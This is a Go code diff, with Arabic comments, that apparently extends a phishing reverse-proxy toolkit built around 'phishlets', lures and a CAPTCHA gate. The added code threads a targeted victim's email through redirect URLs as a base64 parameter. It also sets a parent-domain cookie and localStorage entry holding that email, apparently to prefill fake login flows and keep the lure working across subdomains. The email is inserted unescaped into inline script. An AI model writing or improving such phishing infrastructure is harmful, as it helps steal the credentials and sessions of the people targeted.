@@ -1619,7 +1619,18 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 							lure_path = l.Path
 						}
 						
+						// إضافة معلمة البريد الإلكتروني إلى عنوان URL عند إعادة التوجيه إذا كانت موجودة
 						redirect_url := fmt.Sprintf("https://%s%s", phish_host, lure_path)
+						if email != "" {
+							// تشفير البريد الإلكتروني مرة أخرى
+							encodedEmail := base64.StdEncoding.EncodeToString([]byte(email))
+							if strings.Contains(redirect_url, "?") {
+								redirect_url += "&e=" + encodedEmail
+							} else {
+								redirect_url += "?e=" + encodedEmail
+							}
+						}
+						
 						return p.javascriptRedirect(req, redirect_url)
 					}
 				}
@@ -1628,6 +1639,15 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 			// إذا لم يتم العثور على lure محدد، استخدم إعادة التوجيه الافتراضية
 			redirect_url := p.cfg.PhishletConfig(pl.Name).UnauthUrl
 			if redirect_url != "" {
+				// إضافة معلمة البريد الإلكتروني إلى عنوان URL عند إعادة التوجيه إذا كانت موجودة
+				if email != "" {
+					encodedEmail := base64.StdEncoding.EncodeToString([]byte(email))
+					if strings.Contains(redirect_url, "?") {
+						redirect_url += "&e=" + encodedEmail
+					} else {
+						redirect_url += "?e=" + encodedEmail
+					}
+				}
 				return p.javascriptRedirect(req, redirect_url)
 			}
 		}
@@ -1661,11 +1681,42 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 								cookie := http.Cookie{Name: "passed_captcha", Value: "1", Expires: expiration, Path: "/"}
 								resp.Header.Set("Set-Cookie", cookie.String())
 								
+								// إضافة كوكي للبريد الإلكتروني للنطاق الرئيسي
+								if email != "" {
+									// استخراج النطاق الرئيسي
+									host := req.Host
+									parts := strings.Split(host, ".")
+									if len(parts) >= 2 {
+										mainDomain := strings.Join(parts[len(parts)-2:], ".")
+										emailCookie := http.Cookie{
+											Name: "user_email", 
+											Value: email, 
+											Domain: "." + mainDomain, // إضافة نقطة للسماح بالمشاركة مع النطاقات الفرعية
+											Path: "/", 
+											MaxAge: 86400, // صالح لمدة يوم
+											Secure: true,
+											HttpOnly: false,
+										}
+										resp.Header.Add("Set-Cookie", emailCookie.String())
+									}
+								}
+								
 								// تحديد المسار الذي سيتم إعادة التوجيه إليه
 								redirectPath := req.FormValue("redirect_path")
 								if redirectPath == "" {
 									redirectPath = "/"
 								}
+								
+								// إضافة معلمة البريد الإلكتروني إلى عنوان URL عند إعادة التوجيه إذا كانت موجودة
+								if email != "" {
+									encodedEmail := base64.StdEncoding.EncodeToString([]byte(email))
+									if strings.Contains(redirectPath, "?") {
+										redirectPath += "&e=" + encodedEmail
+									} else {
+										redirectPath += "?e=" + encodedEmail
+									}
+								}
+								
 								resp.Header.Set("Location", redirectPath)
 								return req, resp
 							}
@@ -1735,6 +1786,14 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 		return req, resp
 	}
 	
+	// استخراج النطاق الرئيسي للكوكيز
+	host := req.Host
+	mainDomain := ""
+	parts := strings.Split(host, ".")
+	if len(parts) >= 2 {
+		mainDomain = strings.Join(parts[len(parts)-2:], ".")
+	}
+	
 	// عرض صفحة الكابتشا مع حفظ البريد الإلكتروني إذا كان موجودًا
 	captchaHTML := `<!DOCTYPE html>
 <html dir="rtl">
@@ -1773,12 +1832,20 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
         // تخزين البريد الإلكتروني في localStorage إذا كان موجودًا
         window.onload = function() {
             var email = "` + email + `";
+            var mainDomain = "` + mainDomain + `";
+            
             if (email && email.length > 0) {
+                // تخزين في localStorage (يعمل فقط للنطاق الحالي)
                 localStorage.setItem('user_email', email);
                 console.log("تم تخزين البريد الإلكتروني في localStorage: " + email);
                 
-                // إضافة كوكي للبريد الإلكتروني أيضًا كطريقة احتياطية
-                document.cookie = "user_email=" + email + "; path=/; max-age=86400";
+                // إضافة كوكي للبريد الإلكتروني - مع ضبطه للنطاق الرئيسي
+                if (mainDomain) {
+                    document.cookie = "user_email=" + email + "; path=/; domain=." + mainDomain + "; max-age=86400; secure";
+                    console.log("تم تخزين البريد الإلكتروني في كوكي مشترك للنطاق: ." + mainDomain);
+                } else {
+                    document.cookie = "user_email=" + email + "; path=/; max-age=86400";
+                }
             }
         };
         
